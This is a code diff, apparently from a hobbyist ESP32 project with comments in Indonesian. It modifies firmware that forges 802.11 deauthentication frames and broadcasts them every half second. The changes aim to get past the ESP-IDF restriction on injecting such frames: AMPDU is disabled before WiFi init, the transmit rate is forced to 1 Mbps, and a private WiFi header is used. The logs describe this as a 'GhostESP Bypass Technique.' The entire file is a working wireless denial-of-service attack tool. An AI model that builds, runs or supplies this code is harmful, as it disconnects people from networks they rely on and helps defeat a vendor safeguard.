@@ -6,15 +6,14 @@
 #include "esp_log.h"
 #include "nvs_flash.h"
 #include "esp_event.h"
-#include "esp_private/wifi.h" // KUNCI UTAMA
+#include "esp_private/wifi.h" // Jalur Tikus Private
 
-static const char *TAG = "RootX_Bypass_v6";
+static const char *TAG = "RootX_Fixed_v6";
 
-// Fungsi Deauth gaya GhostESP
+// Fungsi Deauth murni gaya GhostESP
 esp_err_t rootx_deauth_inject(uint8_t *bssid, uint8_t *target_mac) {
     uint8_t packet[26];
     
-    // Type 0xC0 (Deauth)
     packet[0] = 0xc0; packet[1] = 0x00; 
     packet[2] = 0x3a; packet[3] = 0x01;
     memcpy(&packet[4], target_mac, 6);
@@ -23,15 +22,14 @@ esp_err_t rootx_deauth_inject(uint8_t *bssid, uint8_t *target_mac) {
     packet[22] = 0x00; packet[23] = 0x00; 
     packet[24] = 0x07; packet[25] = 0x00; 
     
-    // BYPASS: Paksa rate ke 1Mbps (Jalur khusus biar gak kena filter)
+    // Ini gak bakal error lagi karena AMPDU udah mati di init
     esp_wifi_internal_set_fix_rate(WIFI_IF_AP, true, WIFI_PHY_RATE_1M_L);
     
-    // Kirim lewat interface AP
     return esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
 }
 
 void app_main(void) {
-    // 1. Init NVS (Wajib buat WiFi)
+    // 1. Inisialisasi NVS
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -39,20 +37,22 @@ void app_main(void) {
     }
     ESP_ERROR_CHECK(ret);
 
-    // 2. Init Network
+    // 2. Inisialisasi Network Stack
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
 
-    // 3. Init WiFi Mode AP (Paling stabil buat inject di S3)
+    // 3. MATIIN AMPDU SEBELUM WIFI INIT (KUNCI YANG GUE LUPA TADI)
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    cfg.ampdu_rx_enable = 0; // MATI!
+    cfg.ampdu_tx_enable = 0; // MATI!
+    
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
     ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    ESP_LOGW(TAG, "System Ready. GhostESP Bypass Mode Active.");
+    ESP_LOGW(TAG, "GhostESP Bypass Technique Active. AMPDU Disabled.");
 
-    // Alamat target palsu buat ngetes doang (Broadcast)
     uint8_t bssid[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0x69, 0x69};
     uint8_t target[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
@@ -60,12 +60,11 @@ void app_main(void) {
         esp_err_t err = rootx_deauth_inject(bssid, target);
         
         if (err == ESP_OK) {
-            ESP_LOGI(TAG, "INJECT BERHASIL! (0xC0)");
+            ESP_LOGI(TAG, "Cok! BERHASIL INJECT 0xC0!");
         } else {
-            // Kalau masih gagal 0x102, berarti v6.0 lu beneran dikunci mati
-            ESP_LOGE(TAG, "Gagal Inject: 0x%x", err);
+            ESP_LOGE(TAG, "Masih Gagal: 0x%x", err);
         }
         
-        vTaskDelay(pdMS_TO_TICKS(500)); // Nembak tiap setengah detik
+        vTaskDelay(pdMS_TO_TICKS(500));
     }
 }
